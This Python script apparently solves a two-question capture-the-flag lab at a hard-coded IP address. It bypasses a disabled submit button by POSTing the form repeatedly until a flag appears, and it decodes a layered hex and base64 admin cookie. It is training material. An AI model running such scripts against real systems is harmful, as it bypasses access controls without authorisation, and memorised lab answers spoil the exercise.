#!/usr/bin/env python3
"""
CTF solver for the two questions on the target (154.57.164.70:37327).

1-savol  /lucky.php   -> the submit button is 'disabled'; enabling it (i.e. POSTing
                         the form) only wins a flag by chance, so retry until it
                         returns an HTB{...} flag.
2-savol  /admin.php   -> the 'cookie' Set-Cookie value is encoded several times;
                         keep decoding (hex -> base64 -> ...) until the plaintext is
                         exactly 31 characters long.

Run:  python3 solutions/solve.py [BASE_URL]
"""
import base64
import re
import sys
import urllib.parse
import urllib.request

DEFAULT_BASE = "http://154.57.164.70:37327"
FLAG_RE = re.compile(r"HTB\{[^}]*\}")
MAX_TRIES = 200


def post_flag(base):
    """Enable the disabled button by submitting the form; retry until we win."""
    data = urllib.parse.urlencode({"getflag": "true"}).encode()
    for attempt in range(1, MAX_TRIES + 1):
        req = urllib.request.Request(base + "/lucky.php", data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        with urllib.request.urlopen(req, timeout=20) as resp:
            body = resp.read().decode("utf-8", "replace")
        match = FLAG_RE.search(body)
        if match:
            return match.group(0), attempt
    raise RuntimeError("no flag returned after %d attempts" % MAX_TRIES)


def _try_hex(value):
    try:
        decoded = bytes.fromhex(value).decode("utf-8")
    except (ValueError, UnicodeDecodeError):
        return None
    return decoded if decoded != value else None


def _try_base64(value):
    try:
        decoded = base64.b64decode(value, validate=True).decode("utf-8")
    except Exception:
        return None
    return decoded if decoded != value else None


def decode_cookie(value, target_len=31, max_layers=12):
    """Repeatedly decode a hex/base64 string until it is target_len chars long."""
    seen = set()
    layers = []
    current = value
    for _ in range(max_layers):
        if len(current) == target_len:
            return current, layers
        if current in seen:
            break
        seen.add(current)
        for name, decoder in (("hex", _try_hex), ("base64", _try_base64)):
            decoded = decoder(current)
            if decoded:
                layers.append(name)
                current = decoded
                break
        else:
            break
    return current, layers


def get_cookie(base):
    """Read the 'cookie' Set-Cookie header that /admin.php hands out."""
    with urllib.request.urlopen(base + "/admin.php", timeout=20) as resp:
        for header, raw in resp.getheaders():
            if header.lower() == "set-cookie" and raw.lower().startswith("cookie="):
                return raw.split("=", 1)[1].split(";", 1)[0]
    raise RuntimeError("no 'cookie' Set-Cookie header found")


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE
    base = base.rstrip("/")

    flag, attempt = post_flag(base)
    print("1-savol (lucky.php flag): %s   (won on attempt %d)" % (flag, attempt))

    cookie = get_cookie(base)
    plain, layers = decode_cookie(cookie, target_len=31)
    print("2-savol (cookie value):   %s   (%s)" % (plain, " -> ".join(layers) or "plain"))
    if len(plain) != 31:
        print("warning: decoded value is not 31 characters long", file=sys.stderr)


if __name__ == "__main__":
    main()
